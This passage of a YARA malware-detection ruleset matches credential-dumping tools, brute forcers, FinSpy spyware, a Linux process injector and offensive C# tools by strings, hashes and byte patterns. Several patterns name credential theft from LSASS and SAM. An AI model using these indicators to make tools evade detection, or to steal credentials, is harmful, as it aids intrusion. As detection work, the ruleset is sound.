\"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n\t\t$s2 = \"Benjamin Delpy\" fullword ascii\n\t\t$s3 = \"GlobalSign\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule kiwi_tools_gentil_kiwi {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash8 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash9 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash10 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash11 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash12 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash13 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash14 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash15 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"mimikatz\" fullword wide\n\t\t$s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n\t\t$s3 = \"Gentil Kiwi\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule dubrute : bruteforcer toolkit\n{\n    meta:\n        author = \"Christian Rebischke (@sh1bumi)\"\n        date = \"2015-09-05\"\n        description = \"Rules for DuBrute Bruteforcer\"\n        in_the_wild = true\n        family = \"Hackingtool/Bruteforcer\"\n    \n    strings:\n        $a = \"WBrute\"\n        $b = \"error.txt\"\n        $c = \"good.txt\"\n        $d = \"source.txt\"\n        $e = \"bad.txt\"\n        $f = \"Generator IP@Login;Password\"\n\n    condition:\n        //check for MZ Signature at offset 0\n        uint16(0) == 0x5A4D \n\n        and \n\n        //check for dubrute specific strings\n        $a and $b and $c and $d and $e and $f \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule FinSpy_2\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        $mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        $mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        $versions1 = /(f)inspyv2/ nocase\n        $versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx\n}\n\nrule FinSpy\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n        author = \"AlienVault Labs\"\n\n    strings:\n        $filter1 = \"$password14\"\n        $filter2 = \"$screenrec7\"\n        $filter3 = \"$micrec\"\n        $filter4 = \"$skyperec3\"\n        $filter5 = \"$mouserec2\"\n        $filter6 = \"$driver\"\n        $filter7 = \"$janedow2\"\n        $filter8 = \"$bootkit2\"\n\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        //$mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        //$mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        //$versions1 = /(f)inspyv2/ nocase\n        //$versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2016-02-05\n\tIdentifier: Powerkatz\n*/\n\nrule Powerkatz_DLL_Generic {\n\tmeta:\n\t\tdescription = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"PowerKatz Analysis\"\n\t\tdate = \"2016-02-05\"\n\t\tsuper_rule = 1\n\t\tscore = 80\n\t\thash1 = \"c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae\"\n\t\thash2 = \"1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0\"\n\t\thash3 = \"49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872\"\n\tstrings:\n\t\t$s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n\t\t$s2 = \"%*s  pPublicKey         : \" fullword wide\n\t\t$s3 = \"ad_hoc_network_formed\" fullword wide\n\t\t$s4 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n\t\t$s5 = \"\\\\*.kirbi\" fullword wide\n\n\t\t$c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n\t\t$c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}\n\n/* \t\tYara rule to detect ELF Linux process injector toolkit \"mandibule\" generic.\n   \t\tname: TOOLKIT_Mandibule.yar analyzed by unixfreaxjp. \n\t\tresult:\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-stripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dun64-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dyn64-stripped\n\n   \t\tThis Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) \n   \t\tand  open to any user or organization, as long as you use it under this license.\n*/\n\nprivate rule is__str_mandibule_gen1 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$str01 = \"shared arguments too big\" fullword nocase wide ascii\n\t\t$str02 = \"self inject pid: %\" fullword nocase wide ascii\n\t\t$str03 = \"injected shellcode at 0x%lx\" fullword nocase wide ascii        \t\n\t\t$str04 = \"target pid: %d\" fullword nocase wide ascii        \t\n\t\t$str05 = \"mapping '%s' into memory at 0x%lx\" fullword nocase wide ascii\n\t\t$str06 = \"shellcode injection addr: 0x%lx\" fullword nocase wide ascii\n\t\t$str07 = \"loading elf at: 0x%llx\" fullword nocase wide ascii\n\tcondition:\n                4 of them\n}\n\nprivate rule is__hex_top_mandibule64 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$hex01 = { 48 8D 05 43 01 00 00 48 89 E7 FF D0 } // st\n\t\t$hex02 = { 53 48 83 EC 50 48 89 7C 24 08 48 8B 44 24 08 } // mn\n\t\t$hex03 = { 48 81 EC 18 02 00 00 89 7C 24 1C 48 89 74 } // pt\n\t\t$hex04 = { 53 48 81 EC 70 01 01 00 48 89 7C 24 08 48 8D 44 24 20 48 05 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nprivate rule is__hex_mid_mandibule32 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-06-01\"\n\tstrings:\n\t\t$hex05 = { E8 09 07 00 00 81 C1 FC 1F 00 00 8D 81 26 E1 FF FF } // st\n\t\t$hex06 = { 56 53 83 EC 24 E8 E1 05 00 00 81 C3 D0 1E 00 00 8B 44 24 30} // mn\n\t\t$hex07 = { 81 C3 E8 29 00 00 C7 44 24 0C } // pt\n\t\t$hex08 = { E8 C6 D5 FF FF 83 C4 0C 68 00 01 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nrule TOOLKIT_Mandibule {\n\tmeta:\n\t\tdescription = \"Generic detection for ELF Linux process injector mandibule generic\"\n\t\treference = \"https://imgur.com/a/MuHSZtC\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-06-01\"\n\tcondition:\n\t\t((is__str_mandibule_gen1) or (is__hex_mid_mandibule32))\n\t\tor ((is__str_mandibule_gen1) or (is__hex_top_mandibule64))\n\t\tand is__elf\n\t\tand filesize < 30KB \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule whosthere_alt : Toolkit {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de\"\n\tstrings:\n\t\t$s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */\n\t\t$s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s2 = \"dump output to a file, -o filename\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */\n\t\t$s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii /* score: '24.00' */\n\t\t$s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s6 = \".\\\\pth.dll\" fullword ascii /* score: '16.00' */\n\t\t$s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 280KB and 2 of them\n}\n\nrule iam_alt_iam_alt : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90\"\n\tstrings:\n\t\t$s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */\n\t\t$s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */\n\t\t$s3 = \"username:domainname:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s4 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii /* score: '12.00' */\n\t\t$s6 = \"nthash is too long!.\" fullword ascii /* score: '8.00' */\n\t\t$s7 = \"LSASS HANDLE: %x\" fullword ascii /* score: '5.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule genhash_genhash : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file genhash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f\"\n\tstrings:\n\t\t$s1 = \"genhash.exe <password>\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"Password: %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii /* score: '11.00' */\n\t\t$s5 = \"This tool generates LM and NT hashes.\" fullword ascii /* score: '10.00' */\n\t\t$s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii /* score: '10.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule iam_iamdll : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iamdll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602\"\n\tstrings:\n\t\t$s0 = \"LSASRV.DLL\" fullword ascii /* score: '21.00' */\n\t\t$s1 = \"iamdll.dll\" fullword ascii /* score: '21.00' */\n\t\t$s2 = \"ChangeCreds\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule iam_iam : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231\"\n\tstrings:\n\t\t$s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s2 = \"iam.exe -h administrator:mydomain:\"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */\n\t\t$s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */\n\t\t$s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii /* score: '26.00' */\n\t\t$s6 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s7 = \"Checking LSASRV.DLL....\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule whosthere_alt_pth : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file pth.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0\"\n\tstrings:\n\t\t$s0 = \"c:\\\\debug.txt\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n\t\t$s1 = \"pth.dll\" fullword ascii /* score: '20.00' */\n\t\t$s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii /* score: '7.00' */\n\t\t$s3 = \"\\\"Primary\\\" string not found!\" fullword ascii /* score: '6.00' */\n\t\t$s4 = \"segment 1 found at %.8Xh\" fullword ascii /* score: '6.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 4 of them\n}\n\nrule whosthere : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37\"\n\tstrings:\n\t\t$s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */\n\t\t$s2 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */\n\t\t$s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n\t\t$s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and 2 of them\n}\n\nrule Powerstager\n{\n    meta:\n      author = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n      date = \"02JAN2018\"\n      hash1 = \"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa\" //x86\n      hash2 = \"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5\" //x64\n      description = \"Detects PowerStager Windows executable, both x86 and x64\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/\"\n      reference2 = \"https://github.com/z0noxz/powerstager\"\n    \n    strings:\n      $filename = /%s\\\\[a-zA-Z0-9]{12}/\n      $pathname = \"TEMP\" wide ascii\n//    $errormsg = \"The version of this file is not compatible with the version of Windows you're running.\" wide ascii\n      $filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n      $apicall_01 = \"memset\"\n      $apicall_02 = \"getenv\"\n      $apicall_03 = \"fopen\"\n      $apicall_04 = \"memcpy\"\n      $apicall_05 = \"fwrite\"\n      $apicall_06 = \"fclose\"\n      $apicall_07 = \"CreateProcessA\"\n      $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n      $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n      $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n      $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n\n    condition:\n      uint16be(0) == 0x4D5A\n        and\n      all of ($apicall_*)\n        and\n      $filename\n        and\n      $pathname\n        and\n      $filedesc\n        and\n      (2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule QuarksPwDump_Gen : Toolkit  {\n\tmeta:\n\t\tdescription = \"Detects all QuarksPWDump versions\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-09-29\"\n\t\tscore = 80\n\t\thash1 = \"2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa\"\n\t\thash2 = \"87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f\"\n\t\thash3 = \"a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9\"\n\t\thash4 = \"c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab\"\n\t\thash5 = \"677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa\"\n\t\thash6 = \"d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674\"\n\t\thash7 = \"8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819\"\n\tstrings:\n\t\t$s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n\t\t$s2 = \"%d dumped\" fullword ascii\n\t\t$s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n\t\t$s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// These rules have room for false positives if e.g. a dual use tool is contained within a hack tool repo.\n// Could also be done with https://yara.readthedocs.io/en/stable/modules/dotnet.html#c.typelib but that needs an extra module.\n\n\nrule HKTL_NET_GUID_CSharpSetThreadContext {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/CSharpSetThreadContext\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a1e28c8c-b3bd-44de-85b9-8aa7c18a714d\" ascii nocase wide\n        $typelibguid1 = \"87c5970e-0c77-4182-afe2-3fe96f785ebb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ihack4falafel/DLL-Injection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3d7e1433-f81a-428a-934f-7cc7fcf1149d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeUSB_Csharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeUSB-Csharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"94ea43ab-7878-4048-a64e-2b21b3b4366d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Ladon {\n    meta:\n        description = \"Detects c# 